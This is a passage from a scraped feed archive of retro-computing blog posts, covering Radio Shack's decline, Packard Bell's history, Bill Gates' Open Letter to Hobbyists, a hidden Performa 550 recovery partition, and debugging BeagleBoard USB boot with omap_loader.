stores within a five-minute drive of each other no longer made sense when each store only had 1-2 customers at any given time. It basically doubled the corporate parent company\u2019s overhead to serve the area, since they had to pay rent two places, keep enough inventory to fill two stores, and keep 1-2 employees in each store at all times. As time wore on, both stores suffered as corporate struggled to keep inventory stocked. I remember going to one store, only to find out they didn\u2019t have what I needed in stock, so I had to drive to the other one to get it. It was always anyone\u2019s guess which store was more likely to have what I needed. This was before the days when you could just visit a web site and check inventory online to see which location had what you needed in stock. Employee stories of this time painted a sad picture. Radio Shack couldn\u2019t close its underperforming stores The problem was Radio Shack had too many stores, but they couldn\u2019t close them. Rumor was they didn\u2019t have the money to close the stores, but there was another problem. A $250 million loan Radio Shack took from Salus Capital in 2013 limited Radio Shack to closing 200 stores a year without Salus\u2019 approval. In 2014, Radio Shack asked to close 1,000 stores, but Salus denied the request. Why Salus didn\u2019t protect its interests by letting Radio Shack\u2019s management do what it needed to do to remain solvent and pay the loan, I\u2019m not sure. Meanwhile, Radio Shack couldn\u2019t shore up its online presence to better compete with Amazon and Ebay. While other retail stores had started making it possible to check inventory online and order online for in-store pickup to be more convenient, Radio Shack didn\u2019t have the money to modernize. The dilemma of what to sell Radio Shack had been selling cellular phones since the 1980s. Smartphones increasingly could replace the majority of what Radio Shack stores sold for decades. So it made sense for Radio Shack to shift and sell more phones and fewer other consumer electronics. The problem was, as phones became an increasing percentage of what Radio Shack sold, competition heightened and profit margins shrunk. Carriers started subsidizing phones and opening their own stores to cut out the middleman. Besides Radio Shack, guess who else operated a retail store in the closed-air mall near me and a second location in a strip mall near me? Every major phone carrier, that\u2019s who. Well, not every major phone carrier operated two stores near me. Some operated three. And the reduced foot traffic made it hard to sell electronic toys like the Armatron and the siren-equipped fire chief\u2019s helmet to make up the difference. In theory, Radio Shack could have shifted again, turning itself into a miniature Best Buy, selling TVs, set top boxes like Rokus , audio gadgets, and game consoles, along with all the cables and adapters you\u2019d need. They could have offered a limited selection of largely private label electronics and competed on price, taking advantage of having much lower overhead because its stores were 1/10 the size. But they didn\u2019t have the money to do it. The $43 million in cash on hand at the time of bankruptcy wasn\u2019t enough capital to make that change. Bankruptcy wasn\u2019t quite the end of the line for Radio Shack In May 2015, General Wireless, a subsidiary of Standard General, purchased the Radio Shack brand name and related intellectual property for $26.2 million and partnered with Sprint to operate the stores. The very last time I visited Radio Shack in person was in January 2017, when it was under General Wireless ownership. Most of the other traffic while I was in the store was related to a Pokemon Go promotion they were running. One of the employees told me they expected the store would close soon. Sprint was struggling too, and the two companies didn\u2019t save each other. By March 2017, General Wireless filed for bankruptcy and started closing stores, shifting most of its business online. Modern-day Radio Shack Retail Ecommerce Ventures, a holding company owned by Alex Mehr and self-help influencer Tai Lopez, acquired Radio Shack in November 2020. In May 2023, Unicomer Group acquired control of the worldwide Radio Shack franchise. Unicomer is based in El Salvador and is one of the largest franchisors of Radio Shack, with stores in Central America, South America, and the Caribbean. The 2015 and 2017 bankruptcies resulted in the majority of Radio Shack stores in the United States closing. Most of what\u2019s left are franchises. Not long ago, I was picking up lunch, wearing my Radio Shack t-shirt sporting the iconic 1970s logo. The cashier gave me a puzzled look and asked me where the closest Radio Shack is. I said I didn\u2019t know. I looked it up when I got home because I was curious. Turns out it\u2019s 60 miles away, in Nashville, Illinois. But they have a much improved online presence now. If you want a snazzy Radio Shack mousepad for your retro computer and a Radio Shack USB flash drive for your Gotek in your retro computer , they\u2019ve got you covered. I use one of each with my Tandy 1000 EX. It just seems right. If you found this post informative or helpful, please share it! share share save share share share pocket share email RSS feed Dave Farquhar David Farquhar is a computer security professional, entrepreneur, and author. He has written professionally about computers since 1991, so he was writing about retro computers when they were still new. He has been working in IT professionally since 1994 and has specialized in vulnerability management since 2013. He holds Security+ and CISSP certifications. Today he blogs five times a week, mostly about retro computers and retro gaming covering the time period from 1975 to 2000. Like this: Like Loading... Related stories by Dave Farquhar</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:50</p>"},{"location":"dfarq.homeip.net/What%20happened%20to%20Packard%20Bell-_20260130/","title":"What happened to Packard Bell?","text":"<p>\u6765\u6e90: dfarq.homeip.net \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 12:00:54 +0000 \u94fe\u63a5: https://dfarq.homeip.net/happened-packard-bell/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=happened-packard-bell</p> <p>Dave Farquhar Retro Computing January 30, 2026 January 30, 2026 2 Comments What happened to Packard Bell computers? The firm ceased operations in the United States in 2000. Its former rival, Acer, acquired the brand January 31, 2008 for $46 million. It was a once-unimaginable outcome for what had been the top-selling computer brand in the United States. But there\u2019s more to the story than that. The Packard Bell story is a brilliant piece of marketing. The computers were terrible, but the marketing was as good as it gets. And that\u2019s one of the reasons people remember it as one of the more prominent of the 90s computer brands , even if many who remember it don\u2019t remember it fondly. Packard Bell thrived on brand confusion This promotional coffee mug features the slogan \u201cAmerica grew up listening to us. It still does.\u201d The slogan encouraged people to think of an upstart as an old company. It dates to the late 1980s or early 1990s. What happened to Packard Bell? Bad quality caught up with it. In 1986, Packard Bell was the name of a defunct manufacturer of TVs and radios. Founded in 1926 or 1933 depending on how you count it, it survived until 1968 when it sold out to Teledyne. In the 1980s the brand still had some name recognition on its own. But look at the other names it resembled: Pacific Bell, the telephone company. Hewlett Packard , the computer company. Packard, the defunct maker of luxury cars. It sounded like an old-line company making quality products, which was what Beny Alagem counted on. He even put the slogan \u201cAmerica grew up listening to us. It still does,\u201d on its early marketing literature. People always confused them for something they weren\u2019t, and for a time, it helped. \u201cI don\u2019t know about other brands,\u201d one customer said to me when I was selling computers in 1994, pointing at Compaq and Dell. \u201cBut Packard Bell, that\u2019s an old company.\u201d Even my coworkers routinely thought Packard Bell was related to HP or to Packard, the car maker. Brand resurrections don\u2019t always work . But this one was one of the more successful ones in history, better than Atari but not quite as good as DeWalt . I think this one worked because there were multiple factors involved. Packard Bell\u2019s industrial design This Packard Bell D160 dates to the mid 1990s. The gray panel accents, created by Frog Design, were innovative for the time. Also note the updated logo. For about the first seven years, Packard Bell computers were generic-looking clones, but in 1994 they started changing things up. They had been one of the first companies to try to make desktop PCs smaller. And in 1994 when everyone was selling beige boxes, they brought in a firm called Frog Design to revamp their cases with different colors and even changing form factors including an unorthodox\u00a0L-shaped corner design . Was it great design? Ask an industrial designer. But I have to give them credit for trying. At the very least, their computers had a distinctive look. I will say my graphic design professor in college, Dr. Birgit Wassmuth, who was a huge admirer of Apple and SGI, called out Packard Bell by name for trying to make computers that weren\u2019t boring beige boxes. At the time, their designs were more bold than anything even Apple dared. From her perspective, here was a firm giving SGI-like designs at a rock-bottom price. But it takes more than industrial design to make great computers. What happened to Packard Bell? One of my classmates answered Dr. Wassmuth: \u201cPackard BELL? They make the lowest quality computers you can buy!\u201d Dr. Wassmuth diplomatically said she could only comment on the industrial design. She was a professor of design, not electrical engineering. It would have been a brilliant move, but instead, it was more like a last hurrah before their quality issues started catching up with them. Quality, or lack thereof Early on, Packard Bell PCs were OK. Their XT- and 286-class PCs lacked pizzazz, but by and large gave average reliability for a low price. That was largely because they were rebadged machines made by other OEMs, such as Samsung. By the 386SX era though, they were cheap and unreliable. And they stayed that way. The price meant they sold well. Very well, well enough to overtake Tandy as the best-selling brand of computer in North America. Typically they cost a couple hundred dollars less than a comparable PC from Hewlett Packard, Compaq (then a separate company), Dell , or IBM . When I worked at Best Buy in the mid 1990s, Packard Bell may have accounted for 50% of our computer sales, on its own. The problem was that if there was a corner to cut, they cut it. With exactly one exception. Since they put Intel CPUs in their PCs, they benefited from Intel\u2019s \u201cIntel Inside\u201d marketing campaign. Even some CIOs thought a Packard Bell computer with an Intel CPU in it was better than anything with an AMD or Cyrix chip in it. It wasn\u2019t true, but it proves how well those marketing campaigns worked together. Our local Compaq sales rep hated Intel for it, and that was why Compaq gave startup cash to Intel competitors like Nexgen . Compaq made better machines and didn\u2019t appreciate Intel telling everyone otherwise. Everything else inside a Packard Bell computer was lowest-bidder. Making matters worse, the power supplies tended to be weird form factors so you couldn\u2019t replace them with a $40 off-the-shelf unit when they failed, which was often. A replacement OEM unit cost $200 and would fail just as quickly as the old one did. Some of their motherboards were NLX form factor, which was expensive but replaceable. Others were weird form factors with no off the shelf replacement. Part of this was due to Packard Bell\u2019s unique industrial design. The computers looked good, but it limited what parts you could use to fix them. Poor quality doesn\u2019t have to be a death sentence. Gateway 2000 sold PCs that were below average in quality. People bought them anyway because Gateway had great customer service. Packard Bell combined below-average quality with lousy customer service. I personally took a lot of phone calls from Packard Bell buyers. It was easier to call the store for answers than the manufacturer. We got more repeat customers than Packard Bell did. Packard Bell\u2019s many sad returns I avoided Packard Bell when I sold computers because I wanted to sell solutions that would last. I saw how many of their computers came back. Officially, it was 1 in 6 sold. Industry average at the time was 1 in 12. Sometimes they came back with a good story. Early in the 386 era, computers came with keys. You could lock them to keep someone from turning them on without permission. Well, someone bought one, brought it home, set it up, and couldn\u2019t make it work. So they brought it back. \u201cI followed the instructions perfectly,\u201d he said. \u201cThen I turned the key and nothing happened!\u201d It\u2019s a computer, not a lawnmower. The key story remained a running joke for years. But more often than not, there was no humorous story involved. Just an unhappy customer who got buyer\u2019s remorse in less than four weeks. The hope was that customer service could talk them into an exchange rather than a refund. Stores\u2019 policies toward Packard Bell I worked at Best Buy for a couple of years. Our main competitor, Circuit City, also carried them. The two stores\u2019 attitudes toward Packard Bell was very different. Circuit City would advertise Packard Bell computers in the Sunday papers, but if you came into the store, they trashed talked Packard Bell, in hopes of getting you to buy an AST instead. And truthfully? They didn\u2019t have to lie. They could honestly say you were twice as likely to have a major problem with a Packard Bell computer than any other brand. Best Buy\u2019s policy was to position Packard Bell in a good-better-best lineup. Packard Bell was (allegedly) good. Acer was better. Compaq, Dell (or HP), and IBM were best. I pushed other brands because I wanted to sleep at night. If a customer came in with their mind set on Packard Bell, I\u2019d load one up on a cart for them. But if they wanted to talk about it, I directed them toward better brands. I never said anything bad about Packard Bell, but I gave nonverbal cues. I sold a lot of computers, but very few Packard Bells. Some of my coworkers flat out lied about Packard Bell quality. I\u2019m not sure if they knew they were lying or were just repeating what they\u2019d heard someone else say. But I wanted to sleep at night so I wouldn\u2019t do that. The favored line, when a customer said they heard Packard Bell computers were bad, was to say they may have had problems in the past, but they\u2019d come a long way, and then offer an extended warranty. Sorry, a \u201cperformance guarantee.\u201d What happened to Packard Bell was that eventually, the lies didn\u2019t work anymore. Once Compaq released its Presario line which narrowed the price difference, there was little reason to buy the lower quality machine. Few repeat buyers Not many people bought a second Packard Bell. They\u2019d get a $1,500 bundle\u2013which was cheap for the time\u2013and when the computer broke, they\u2019d buy a different brand and reuse the monitor and printer and whatever was left in the machine that still worked. Frequently the memory, CD-ROM drive, and sound card could be salvaged and re-used in a new PC. Packard Bell consistently received bad ratings from the PC magazines like PC World and PC Magazine and from consumer magazines like Consumer Reports . But the final blow was the 1995 revelation in that Packard Bell routinely sold \u201cnew\u201d PCs with recycled parts in them. That year, Packard Bell merged with NEC, the Japanese electronics maker. Some hoped that would mean better quality and lower prices due to the increased volume. The synergy didn\u2019t happen. By 2000, NEC pulled the name off the market. Packard Bell survived longer in Europe, though in name only as a division of Acer. Acer acquired Packard Bell on January 31, 2008 for a mere $46 million. Speculation at the time was that Acer bought Packard Bell to keep Lenovo from getting the brand nam</p> <p>... (\u5185\u5bb9\u5df2\u622a\u65ad)</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:56</p>"},{"location":"dfarq.homeip.net/When%20Bill%20Gates%20claimed%20to%20work%20for%20%242%20an%20hour_20260203/","title":"When Bill Gates claimed to work for $2 an hour","text":"<p>\u6765\u6e90: dfarq.homeip.net \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 12:00:34 +0000 \u94fe\u63a5: https://dfarq.homeip.net/when-bill-gates-claimed-to-work-for-2-an-hour/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=when-bill-gates-claimed-to-work-for-2-an-hour</p> <p>Dave Farquhar Retro Computing February 3, 2026 February 3, 2026 1 Comment The most popular software product for the MITS Altair 8800 computer was Altair Basic , the first Microsoft product. But there was a problem. Only about 10 percent of Altair owners paid for Altair Basic. On February 3, 1976, Bill Gates decided to do something about it. He wrote a letter titled An Open Letter to Hobbyists in which, among other things, he said he made around $2 an hour writing Altair Basic. What Bill Gates\u2019 product did In this Feb. 3, 1976 letter, Gates claimed to make $2 an hour creating Altair Basic, due to piracy. Altair Basic was a useful product, to be sure. It was a programming language that was easy for a hobbyist to learn, even if they didn\u2019t have any formal training in computer science. It meant any hobbyist had a chance to write useful software for their new computer. But if they wanted to share their software with anyone, they needed a copy of the language in order to run it, because it didn\u2019t create standalone programs. To think in modern terms, it was like Python, where you generally need a copy of Python in order to run a program written in that language. It wasn\u2019t like C++, which produced standalone programs. The problem with MITS\u2019 business model MITS sold the computers and Altair Basic at a break-even price. The profit was in memory boards. If you bought memory boards from Altair at $264 each, they\u2019d sell you Altair Basic for $75. If you didn\u2019t buy Altair\u2019s memory boards, Basic cost $500. The problem was, Altair\u2019s 4K memory boards weren\u2019t completely reliable. Its design required the board to steal a cycle from the 8080 CPU to use as a pulse to refresh the memory. And if the CPU was busy and it missed a cycle, the contents of memory are lost. If you don\u2019t have reliable RAM, you don\u2019t have a reliable computer. Because of these problems, third parties started making and selling memory boards for the Altair. This meant some MITS customers were only buying the computer from Altair, then buying a third party memory board that worked. They didn\u2019t want to pay $500 to get what they saw as a necessary piece of software to use the computer. Some didn\u2019t even want to pay $75. A pre-release paper tape of Altair Basic disappeared in June 1975, about a month before MITS and Microsoft had even finalized their contract. A box containing 50 copies of the paper tape appeared at a subsequent Homebrew Computer Club meeting in Menlo Park, California. This was the club Steve Jobs and Steve Wozniak famously attended where they gained the inspiration to build their Apple I computer. Bill Gates\u2019 Open Letter to Hobbyists MITS co-founder Ed Roberts saw the users who pirated Altair Basic as thieves, but also saw third party hardware companies as parasites. One of those companies changed its name to Parasitic Engineering in response to Ed Roberts\u2019 comments. It was against this backdrop of rampant piracy and name calling that Bill Gates wrote a letter titled \u201cAn Open Letter to Hobbyists,\u201d dated February 3, 1976. David Bunnell published the letter in Computer Notes, MITS\u2019 newsletter for its customers. Bunnell also sent copies of the letter to other publications. Five additional publications printed the letter. Gates took an everyman approach, arguing in the letter that pirates weren\u2019t stealing from a large corporation, they were stealing from a fellow hobbyist, one who had invested tens of thousands of dollars into creating the product, and ended up making less than $2 an hour on its sales. He ended with the plea that hobbyists who had copied the software come clean and pay for it, and said he would love to hire 10 programmers to create more software. Microsoft switched to fixed-price contracts rather than piecemeal royalties for its future deals with MITS and other computer makers. The cost ranged from $21,000 to $50,000, with most running around $35,000. Reaction to Gates\u2019 letter and assertions The letter resulted in a few tense responses. Hal Singer, editor of the Micro-8 newsletter, said Roberts initially promised the Altair 8800 would cost $395 but a working system cost $1,000, accusing him of false advertising and suggesting a class action lawsuit or Federal Trade Commission investigation might be in order. Singer also repeated rumors that Altair Basic was developed on a Harvard University computer funded by the US government, and therefore, customers should not pay for software already paid for by the taxpayer. Gates, Paul Allen, and Monte Davidoff had indeed used a PDP-10 at Harvard\u2019s Aiken Computer Center. The PDP-10 was funded by the Department of Defense through its Defense Advanced Research Projects Agency. Harvard officials weren\u2019t pleased that Gates and a non-student, Paul Allen, used the PDP-10 to develop a commercial product. But since the computer belonged to the military, Harvard\u2019s wishes didn\u2019t apply. Professor Thomas Cheatham controlled the PDP-10, and he believed that students could use the machine for personal use. Harvard did eventually succeed in placing restrictions on the computer\u2019s use. Gates and Allen had to use a commercial time share computer in Boston to finalize the software. What happened to MITS and Microsoft Microsoft, of course, went on to become successful, first by selling Basic interpreters to computer manufacturers, then branching into other languages and, eventually, operating systems, application software, and even hardware. Not in that order. Bill Gates went on to become a millionaire, a billionaire, and the world\u2019s richest man, in that order. On December 3, 1976, Ed Roberts sold MITS to Pertec Computer Corporation for $6 million in stock. Roberts received $2 million. The remaining MITS shareholders split the remaining $4 million. Roberts moved to Georgia where he bought a farm and enrolled in medical school, graduating in 1986. He practiced medicine in the small town of Cochran, Georgia, for 24 years until his death in 2010. If you found this post informative or helpful, please share it! share share save share share share pocket share email RSS feed Dave Farquhar David Farquhar is a computer security professional, entrepreneur, and author. He has written professionally about computers since 1991, so he was writing about retro computers when they were still new. He has been working in IT professionally since 1994 and has specialized in vulnerability management since 2013. He holds Security+ and CISSP certifications. Today he blogs five times a week, mostly about retro computers and retro gaming covering the time period from 1975 to 2000. Like this: Like Loading... Related stories by Dave Farquhar</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:53</p>"},{"location":"downtowndougbrown.com/An%20update%20about%20the%20hidden%20Performa%20550%20recovery%20partition_20260205/","title":"An update about the hidden Performa 550 recovery partition","text":"<p>\u6765\u6e90: https://www.downtowndougbrown.com \u94fe\u63a5: https://www.downtowndougbrown.com/2025/08/an-update-about-the-hidden-performa-550-recovery-partition/ \u65e5\u671f: Thu, 28 Aug 2025 02:28:38 +0000</p> <p>Earlier this year, I wrote about how I rescued a special recovery partition from an old Macintosh Performa 550's dead hard drive. This partition had been lost to time and it was a race to try to save it before the remaining Performa 550 machines out there with their original hard drives were reformatted or destroyed. It has now been preserved on the Macintosh Garden. I have a few updates to that post that I'd like to share.</p> <p></p> <p>The first update is that some extra discussion took place in the comments of my original post. Reader \"Greg\" pointed out that there was an Apple employee named John Yen who worked on the Mac OS during the System 7 era, and suggested he might be the \"jy\" in the associated \"msjy\" creator code. That would leave \"ms\" potentially being Microseeds, which is the company that developed Apple Backup.</p> <p>This led me to search further, and I stumbled upon Apple's patent for the automatic OS recovery functionality filed in 1994. It was granted in 2002 and expired in 2019. John Yen is listed as the inventor. The patent contains some screenshots of the exact UI that I experienced while testing the functionality. I never thought to look through patents, but I should have. They are definitely a useful tool for historical research on this type of stuff. I thought that was a really cool discovery. Thanks, Greg!</p> <p>Now, onto the second thing. After my research had seemingly concluded, I never turned off my eBay alerts. Last week, I received a notification about a damaged tray-loading Performa 550 (manufacture date February 1994) being parted out. Sure enough, one of the seller's auctions was a working 160 MB hard drive from the same machine. Of course, I couldn't resist snatching it up.</p> <p></p> <p>As soon as it arrived, I dumped all the contents. I was in for a very pleasant surprise: this hard drive also had the invisible recovery partition intact!</p> <p></p> <p>Better yet, unlike the last one, it still had all of the original Performa software, including Apple Backup, sitting in the Applications folder.</p> <p></p> <p>At one point during my initial search, I was really concerned that I might never find the lost recovery partition. Now everything has changed, and I'm pleased to be able to say I found it twice!</p> <p>This second hard drive is a huge discovery because I now have two data points, which has led me to gain a little more confidence about how I think the special recovery partition was created in the first place. You may recall from my previous post that Apple's own tech notes said that Apple Backup was responsible for creating it, but I was never able to find any evidence supporting that claim. Unfortunately, the original owner had deleted Apple Backup from the first hard drive before I got my hands on it, so I couldn't draw any conclusions.</p> <p>This new-to-me hard drive was exciting because Apple Backup had not been deleted! I was half expecting to find a weird unpreserved version of Apple Backup hanging around on it, but nope. It's just the same version 1.2 from System 7.1P6 that I had already looked at in depth, right down to the creation/modification dates and the exact number of bytes used.</p> <p></p> <p>The hidden partition's contents are exactly the same as what I found on the first hard drive. The file sizes are all precisely the same, and the icons are positioned identically too. That solves one mystery: the weird icon positions inside the invisible partition were not something the original owner caused. They were just weird on all machines.</p> <p> </p> <p>The only difference I found is that the creation and modification dates of the files are slightly different between the two drives. The easiest place to show this is in the Get Info window of the partition. On the left is the first hard drive, and on the right is the second hard drive.</p> <p></p> <p>You can see that the exact same number of bytes have been used, but the partition on the second hard drive was created about 21 hours later. Also, it appears that on both machines, it took about 4-5 minutes to finish populating it.</p> <p>One of the things I called out in my first post on this subject was that the System file strangely had a modification date several months later. It turns out that something similar happened with the second hard drive, but it ended up being a date way back in the past -- the August 27, 1956 date that some Macs default to if the PRAM battery goes bad. Again, hard drive #1 on the left and hard drive #2 on the right:</p> <p></p> <p>I still don't have a great explanation for why the System file's modification date changed on both of these partitions. Maybe a third-party utility or installer happened to tweak the modification date at some point. In my earlier post, I had suggested that the At Ease 'INIT' resource being missing from the System file could have potentially explained the modification date change, but that resource was also missing from the second hard drive's recovery partition System file. Plus, At Ease had not been uninstalled from the second machine. So that blows that theory out of the water. Clearly, the At Ease INIT was never part of the recovery partition's System file.</p> <p>One other interesting thing I found was that the main Hard Disk volume had the exact same creation date on both drives:</p> <p></p> <p>Obviously, I would love to be given the opportunity to analyze a third hard drive in the future to gain even more confidence. With all that in mind, I think I'm much closer to being able to reach a conclusion today:</p> <p>I still can't be 100% sure, but I think this latest hard drive analysis hammers the final nail in the coffin to the theory that the partition was created based on an action the user performed. I now believe the recovery partition was added by Apple in the factory, and the technote was just wrong about Apple Backup being involved. I can't find any code in Apple Backup that does it, and this second hard drive gives me a good reason to doubt that a customized Performa-550-specific Apple Backup version is hiding out there in the wild somewhere.</p> <p>I'm still weirded out by the other initials in the creator code being \"MS\" given that Microseeds developed Apple Backup, but all signs are pointing to this being a factory-programmed thing. I think that makes the most sense anyway. If you're Apple and you've developed this functionality, why would you only enable it after the user has bought a zillion floppy disks and manually performed a backup? Why not just give it to everyone and allow them all to benefit from it?</p> <p>The fact that the creation date of the recovery partition was not exactly the same between the two hard drives, but it was still within less than a day, is fascinating to me. This means the recovery partition wasn't simply imaged onto every machine at a block level, or the dates would have been exactly the same on every machine. Maybe one of the operations performed at the factory during testing was to run a script that created the partition? This would explain why the creation date of the recovery volume was slightly different between the machines.</p> <p>Another data point in favor of this theory comes from a recently-preserved Apple Restoration CD: Market Software Series Volume 1 from March 1994. It has a bunch of factory Performa software bundles. I found a quick comment about \"action atoms\" for a backup partition not being included in the configuration that goes with the ultra-rare Performa 560 Money Magazine Edition:</p> <p></p> <p>I suspect it's referring to the recovery partition, and it's implying that Apple did have some kind of restore/imaging script that created it, and they specifically chose not to put it into this configuration.</p> <p>Unfortunately, the Performa 550 recovery image on this same CD doesn't mention anything about the recovery partition, and doesn't create it. It's also directed to be used for several other Performa models, so I don't think Apple intended for this recovery CD to comprehensively restore a machine to the exact state it was in when it left the factory. It was just meant to restore it to something operable that was close enough.</p> <p>With all that out of the way, there's one last update I want to talk about. In the first post, I mentioned that Apple published another tech note describing a bug where an educational Dinosaur Safari CD game would accidentally cause the machine to jump into recovery mode. I went so far as to buy the game, reproduce the problem, and post a video demonstrating it.</p> <p></p> <p>Looks like Creative Multimedia Corporation beat Apple to the punch at having a Mac app named Safari by almost a decade!</p> <p>Several people were interested in learning more about why Dinosaur Safari did this. What would even cause an app launched from a CD to trigger the system to enter recovery mode? It's definitely an odd bug, and worthy of a little more investigation.</p> <p>I spent a little bit of time in MAME tracing what the game did leading up to the machine deciding to reboot. After looking through some CPU execution logs, I found that it was happening in the middle of InitResources(). When I mentioned this in #mac68k on Libera, Josh Juran quickly explained to me that apps aren't supposed to call InitResources() in the first place. Inside Macintosh Volume I confirms this:</p> <p></p> <p>So that's the problem. The app is calling a system function that it's not supposed to, which results in the re-initialization of a bunch of system stuff, and somehow this causes the Mac to reboot into recovery mode. Strangely, the problem only happens if the app runs directly from the CD. It doesn't happen if you copy it to your hard drive and launch it from there. Weird. Here's the relevant part of the code as viewed in ResEdit:</p> <p></p> <p>It's alongside a bunch of other standard toolbox initialization routines that are often called early during a classic Mac app's lifetime. The developers of Dinosaur Safari inadvertently added a call to InitResources(). It's kind of funny how it's sitting there near the top of Apple's public Resources.h header file, even though it's not supposed to be called by programs. It's almost like they were just daring someone to do it.</p> <p>Anyway, to test this theory, I patched the CD to replace the InitResources trap instruction with a nop instead:</p> <p></p> <p>Using this modified CD, Dinosaur Safari runs perfectly fine and doesn't activate the recovery partition.</p> <p></p> <p>I decided not to dive deeper and figure out the underlying sequence of events that leads to the reboot. It would be way too much reverse engineering work inside the bowels of the classic Mac OS for very little payoff. This experience might be a good clue about why Apple didn't go forward with this functionality. I'd be shocked if Dinosaur Safari was the only program with this bug. Maybe it was too easy to inadvertently jump to recovery mode and confuse users.</p> <p>This should be the end of my investigation into the Performa 550 recovery partition functionality, unless I happen to stumble upon a third hard drive in the future that radically changes my understanding of everything.</p> <p>My blog isn't turning solely into an Apple archaeology project, so if you're not interested in old Mac stuff, never despair. I'll write about lots of other fun stuff too. But as a forewarning, I do have another upcoming post about more obscure Apple software from the '90s that was lost and is now found. This time, it was something that I doubt too many people even remembered existing. It'll be a nice little blast to the past.</p>"},{"location":"downtowndougbrown.com/Debugging%20BeagleBoard%20USB%20boot%20with%20a%20sniffer-%20fixing%20omap_loader%20on%20modern%20PCs_20260205/","title":"Debugging BeagleBoard USB boot with a sniffer: fixing omap_loader on modern PCs","text":"<p>\u6765\u6e90: https://www.downtowndougbrown.com \u94fe\u63a5: https://www.downtowndougbrown.com/2025/11/debugging-beagleboard-usb-boot-with-a-sniffer-fixing-omap_loader-on-modern-pcs/ \u65e5\u671f: Sat, 08 Nov 2025 20:27:32 +0000</p> <p>This post is about the original OMAP3530 BeagleBoard from 2008. Yes, the one so old that it doesn't even show up in the board list on BeagleBoard.org anymore. The BeagleBoard , not the BeagleBone. During my Chumby 8 kernel escapades, at one point I ran into a UART bug that affected multiple drivers, including the omap-serial driver. This led me to buy a BeagleBoard so I could verify the omap-serial bug on hardware.</p> <p></p> <p>After I figured out the bug with the UART driver, I realized that the OMAP3530 has support for booting from USB, so I decided to go off on a random tangent to get USB boot working. There was no problem I was trying to solve or anything like that. I just thought it would be a fun experiment (am I a masochist?). Little did I know, I would be getting myself into some tricky USB packet analysis.</p> <p>I struggled to find info about this process because of how old the OMAP is today. The main utility I found was a program called omap_loader by Grant Hernandez, which is a newer rewrite of Martin Mueller's original omap3_usbload circa 2008. Thanks to some lucky searching combined with the Internet Archive, I connected the dots between 2008 and the present. At some point before 2013, Rick Bronson provided an update to omap3_usbload (along with a patch to TI's X-Loader bootloader) that enabled uploading additional files like a full U-Boot and Linux kernel into RAM after X-Loader, all through USB. This unlocked the ability to boot all the way to Linux from a completely blank BeagleBoard. Grant's newer omap_loader utility also incorporates these same improvements.</p> <p>All of this research was difficult. Many of the links I found pointed to sites like gitorious.org and arago-project.org, both of which no longer exist (although Arago's Git repos are now hosted by TI). eLinux.org's BeagleBoard wiki was totally rearranged at some point and lost its info about USB recovery, and Rick's site no longer exists, but as usual, the Internet Archive saved the day.</p> <p>At some point later on, X-Loader was replaced by U-Boot SPL, so I think that is partially why so much of this info eventually disappeared from the web. But it's a darn shame. This USB booting functionality is really cool, and it seems like most of the documentation for it has slowly gone by the wayside! The main breadcrumbs remaining on modern Google are the newer omap_loader utility, and also some references to Nest thermostats. For example, Nest's X-Loader had the USB patch applied (with some tweaks added).</p> <p>With all that research out of the way, I was ready to try it all out. I compiled omap_loader, grabbed the pre-built binary of x-load.bin that was included with Rick's patchset, and also used a u-boot.bin that I had compiled myself using Buildroot while performing my UART tests with a modern kernel on the BeagleBoard. Then, I tried to load it:</p> <pre><code>$ sudo ./omap_loader -p 0xd009 -f x-load.bin -f u-boot.bin -a 0x80800000 -j 0x80800000 -v  \nOMAP Loader 1.0.0  \nFile 'x-load.bin' at 0x40200000, size 26956  \nFile 'u-boot.bin' at 0x80800000, size 777760  \n[+] scanning for USB device matching 0451:d009...\n</code></pre> <p>The idea behind this command is it sends X-Loader (x-load.bin) as the main payload that the OMAP's on-chip bootloader is listening for over USB. Then, X-Loader starts up. Next, omap_loader sends any additional files using X-Loader's USB protocol. In this case, I've supplied one extra file: u-boot.bin, which I told it to load into RAM at 0x80800000. Finally, the <code>-j 0x80800000</code> argument tells X-Loader to jump into U-Boot rather than hanging around doing nothing afterward.</p> <p>The output of the command looked normal so far. I plugged in my BeagleBoard, which didn't have an SD card inserted and also had its NAND flash erased, so it had no bootloader installed and thus it would attempt a USB boot.</p> <pre><code>[+] successfully opened 0451:d009 (Texas Instruments OMAP3430)  \n[+] got ASIC ID - Num Subblocks [05], Device ID Info [01050134300757], Reserved [13020100], Ident Data [1215010000000000000000000000000000000000000000], Reserved [1415010000000000000000000000000000000000000000], CRC (4 bytes) [150901f7488f2800000000]  \n[-] fatal transfer error (BULK_OUT) for 26956 bytes (0 made it): LIBUSB_ERROR_PIPE  \n[-] failed to send file 'x-load.bin' (size 26956)  \n[-] failed to transfer the first stage file 'x-load.bin'\n</code></pre> <p>Darn. The utility recognized the BeagleBoard being plugged in, but libusb errored out with a pipe error. Long story short, I messed around with a few other computers, and I found that a few of my older computers, old enough that they didn't have USB 3.0 ports on their motherboards, actually worked perfectly fine with omap_loader. I couldn't get it to work properly with most of my modern machines though, AMD or Intel.</p> <p>I thought this would be a great application for a USB sniffer, so I decided to record some traces of success versus failure.</p> <p></p> <p>Here's a link to my in-depth investigation comparing success versus failure on the GitHub issue about this problem. Yep, it turns out I wasn't the only one running into this exact same issue. Grant himself was seeing similar problems, and had come to a similar conclusion that it seemed to be machine-dependent. Other people had mentioned that adding delays at certain points in the code seemed to help. I was intrigued, so I tried to get to the bottom of it.</p> <p>Here's what the USB boot process is supposed to look like, according to TI's OMAP35x Technical Reference Manual:</p> <ul> <li>The OMAP device enumerates as a USB device.</li> <li>Within 300 ms, the host needs to read an \"ASIC ID\" structure from the OMAP or else it will disconnect from USB.</li> <li>Then, the host sends a 4-byte command: 0xF0030002 means to continue booting through USB.</li> <li>Next, the host sends the 4-byte length of bootloader data it wants to transfer.</li> <li>Finally, the host sends the bootloader (X-Loader in this case), which will be loaded into internal SRAM starting at 0x40200000.</li> <li>After the OMAP device receives all of the data, it runs the received bootloader by jumping to 0x40200000.</li> </ul> <p>Again, this process worked perfectly fine on my older computers that don't support USB 3.0, but on my newer computers with USB 3.0, it was hanging up. I did notice that the newer computers were trying to fit a lot more data into a single USB frame. For example, the start of my older computer's communication with the OMAP looked like this:</p> <ul> <li>Frame 1<ul> 